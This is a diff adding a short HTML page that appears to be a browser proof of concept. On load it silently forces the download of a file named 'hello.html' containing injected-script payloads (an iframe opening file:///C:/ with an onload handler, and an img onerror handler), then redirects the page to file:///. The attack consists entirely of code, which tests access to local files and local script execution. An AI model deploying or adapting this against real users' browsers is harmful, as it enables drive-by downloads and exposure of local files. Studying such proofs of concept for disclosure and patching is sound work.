@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+ <body>
+  <script>
+   function download(filename, text) {
+    var element = document.createElement('a');
+    element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+    element.setAttribute('download', filename);
+    element.style.display = 'none';
+    document.body.appendChild(element);
+    element.click();
+    document.body.removeChild(element);
+  }
+   download("hello.html","<iframe src='file:///C:/' height='100%' width='100%' onload=alert(btoa(document))></iframe><img src=s onerror=alert('IamonHelloFile')>");
+  </script>
+ </body>
+</html>
+
+
+<script>
+ window.location="file:///"
+</script>
